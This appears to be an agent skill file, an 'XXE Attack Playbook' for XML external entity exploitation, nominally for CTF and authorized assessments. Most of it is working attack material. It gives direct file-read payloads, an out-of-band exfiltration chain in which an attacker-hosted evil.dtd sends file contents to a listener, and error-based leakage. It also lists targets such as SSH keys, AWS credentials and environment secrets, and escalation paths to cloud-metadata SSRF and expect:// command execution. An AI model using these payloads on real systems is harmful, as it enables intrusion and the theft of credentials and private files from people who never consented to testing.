name: xxe-attack
description: XXE (XML External Entity) exploitation — classic file read, the OOB exfiltration chain via an attacker-hosted DTD (the critical part when direct reflection fails), error-based leakage, and the file/network targets that matter. Also covers the non-obvious entry points: Content-Type switch from JSON to XML, SVG/Office-OpenXML uploads, SOAP endpoints. Use when XML/SVG/OOXML/SOAP is parsed.
---

# XXE Attack Playbook

Authorized CTF/assessment use. XXE = the XML parser resolves external entities you control → read local files, reach internal network, or exfil OOB. The trap is stopping at "no direct reflection" — OOB XXE still wins. Direct read first, then OOB, then error-based.

## 1. Classic file read (direct reflection)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```
`/etc/passwd` reflected = confirmed. Then walk to the flag: `/flag`, `/app/flag.txt`, or read source/config.

## 2. Find the XXE surface (don't miss non-obvious ones)

- Direct XML: SOAP (`application/soap+xml`), REST `application/xml`.
- **Content-Type switch:** any JSON POST can often be re-sent as `Content-Type: application/xml` with an XML body — many backends auto-detect or use dual-format parsers.
- Uploads: `.svg` (SVG is XML), `.docx/.xlsx/.pptx` (Office Open XML — unzip, inject DOCTYPE into `word/document.xml` or `[Content_Types].xml`, repackage).
- RSS/Atom feed parsers, XML config import, PDF generators that embed SVG/XML.

## 3. OOB XXE (the critical part — when the entity is NOT reflected)

**Step 1 — blind confirm:** an entity pointing at your listener that fires = XXE present even with no content echoed:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR_LISTENER/">]>
<root>&xxe;</root>
```

**Step 2 — OOB file exfil via attacker-hosted DTD** (the workhorse):
Host `evil.dtd` on your server:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY send SYSTEM 'http://YOUR_LISTENER/?data=%file;'>">
%exfil;
```
Send to target:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR_LISTENER/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```
The file contents arrive URL-encoded in your server's request log.

**Step 3 — error-based OOB** (when the above is blocked): force a filename error that echoes content in the exception:
```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % err SYSTEM 'file:///NONEXISTENT/%file;'>">
%eval; %err;
```

## 4. What to read (priority)

```
/etc/passwd              → confirm
/proc/self/environ       → env vars (DB creds, API keys, SECRET_KEY)
/proc/self/cmdline       → process args
/flag /flag.txt /app/flag* /challenge/flag*
app source (app.py, config.py) → the map (flag path, secrets)
~/.ssh/id_rsa, .aws/credentials, .bash_history  (Linux)
web.config, wp-config.php, inetpub (Windows)
```

## 5. XXE → SSRF / RCE escalation

- **XXE → SSRF:** the entity URL can be `http://169.254.169.254/...` (cloud metadata) or internal services — same reach as SSRF.
- **XXE → RCE:** `expect://id` (PHP with expect ext), or chain to a known CVE (e.g. Solr XXE→RCE via Velocity writer) when the parser is a named product.
- **PUBLIC external DTD:** a DOCTYPE `PUBLIC` reference triggers an outbound fetch without any entity reflection — a pure blind SSRF/XXE detector.

## Cross-cutting
- **No reflection ≠ no bug.** Always try OOB (collaborator + hosted DTD) before declaring XXE dead.
- **Content-Type switch is the cheapest wide-net probe** on any JSON endpoint.
- Self-verify each read (the returned content matches the target file) before trusting it.
